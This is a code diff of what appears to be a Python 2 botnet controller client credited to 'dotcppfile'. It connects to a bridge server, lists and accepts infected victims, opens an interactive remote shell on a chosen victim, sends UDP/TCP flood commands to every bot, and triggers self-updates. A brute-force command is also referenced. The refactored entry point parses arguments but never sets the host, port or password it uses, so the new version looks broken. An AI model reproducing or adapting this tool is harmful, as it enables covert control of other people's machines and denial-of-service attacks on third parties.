@@ -52,95 +52,98 @@ custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
 
 \n"""
 
-if (len(sys.argv) == 4):
-	host = sys.argv[1]
-	port = int(sys.argv[2])
-	password = sys.argv[3]
-else:
-	sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
+class control():
 
-def main():
-	print intro
-	try:
-		s=socket(AF_INET, SOCK_STREAM)
-		s.connect((host,port))
-	except:
-		sys.exit("[ERROR] Can't connect to server")
-
-	s.send(password)
-
-	while 1:
-		command = raw_input("> ")
+	def main(self):
+		print intro
 		try:
-			if (command == "accept"):
-				s.send("accept")
-				print s.recv(20480)
-			elif (command == "list"):
-				s.send("list")
-				print s.recv(20480)
-			elif ("interact " in command):
-				s.send(command)
-				temporary = s.recv(20480)
-				if ("ERROR" not in temporary):
-					victimpath = s.recv(20480)
-					if ("ERROR" not in victimpath):
-						breakit = False
-						while (breakit == False):
-							msg = raw_input(victimpath)
-							allofem = msg.split(";")
-							for onebyone in allofem: #This your happy day one liners
-								if (onebyone == "stop"):
-									s.send("stop")
-									print "\n"
-									breakit = True
-								elif ("cd " in onebyone):
-									s.send(onebyone)
-									victimpath = s.recv(20480)
-									if ("ERROR" in victimpath):
-										print victimpath
-										breakit = True
-								elif (onebyone == ""):
-									print "[CONTROLLER] Nothing to be sent...\n"
-								else:
-									s.send(onebyone)
-									print s.recv(20480)
-					else:
-						print victimpath
-						break
-				else:
-					print temporary
-			elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
-				s.send(command)
-				print "\n"
-			elif (command == "selfupdateall"):
-				s.send("selfupdateall")
-				print "\n"		
-			elif(command == "clear"):
-				if sys.platform == 'win32':
-					os.system("cls")
-				else:
-					os.system("clear")
-			elif(command == "quit"):
-				s.send("quit")
-				s.close()
-				break
-			elif(command == "help"):
-				print commands
-			elif(command == "credits"):
-				print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
-			else:
-				print "[CONTROLLER] Invalid Command\n"
-		except KeyboardInterrupt:
-			try:
-				s.send("quit")
-				s.close()
-				print ""
-				break
-			except:
-				pass
+			s=socket(AF_INET, SOCK_STREAM)
+			s.connect((host,port))
 		except:
-			print "[CONTROLLER] Connection Closed"
-			s.close()
-			break
+			sys.exit("[ERROR] Can't connect to server")
+	
+		s.send(password)
+	
+		while 1:
+			command = raw_input("> ")
+			try:
+				if (command == "accept"):
+					s.send("accept")
+					print s.recv(20480)
+				elif (command == "list"):
+					s.send("list")
+					print s.recv(20480)
+				elif ("interact " in command):
+					s.send(command)
+					temporary = s.recv(20480)
+					if ("ERROR" not in temporary):
+						victimpath = s.recv(20480)
+						if ("ERROR" not in victimpath):
+							breakit = False
+							while (breakit == False):
+								msg = raw_input(victimpath)
+								allofem = msg.split(";")
+								for onebyone in allofem: #This your happy day one liners
+									if (onebyone == "stop"):
+										s.send("stop")
+										print "\n"
+										breakit = True
+									elif ("cd " in onebyone):
+										s.send(onebyone)
+										victimpath = s.recv(20480)
+										if ("ERROR" in victimpath):
+											print victimpath
+											breakit = True
+									elif (onebyone == ""):
+										print "[CONTROLLER] Nothing to be sent...\n"
+									else:
+										s.send(onebyone)
+										print s.recv(20480)
+						else:
+							print victimpath
+							break
+					else:
+						print temporary
+				elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
+					s.send(command)
+					print "\n"
+				elif (command == "selfupdateall"):
+					s.send("selfupdateall")
+					print "\n"		
+				elif(command == "clear"):
+					if sys.platform == 'win32':
+						os.system("cls")
+					else:
+						os.system("clear")
+				elif(command == "quit"):
+					s.send("quit")
+					s.close()
+					break
+				elif(command == "help"):
+					print commands
+				elif(command == "credits"):
+					print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
+				else:
+					print "[CONTROLLER] Invalid Command\n"
+			except KeyboardInterrupt:
+				try:
+					s.send("quit")
+					s.close()
+					print ""
+					break
+				except:
+					pass
+			except:
+				print "[CONTROLLER] Connection Closed"
+				s.close()
+				break
 		
-main()
+if __name__=="__main__":
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-p", "--port", type=int, help="Connection Port Number", required = True)
+	parser.add_argument("-P", "--password", type=str, help="Bridge Connection Password", required = True)
+	parser.add_argument('-v', '--version',
+						action='version',
+						version=' [+] Version: 1.0')
+	args = parser.parse_args()
+	control().main()
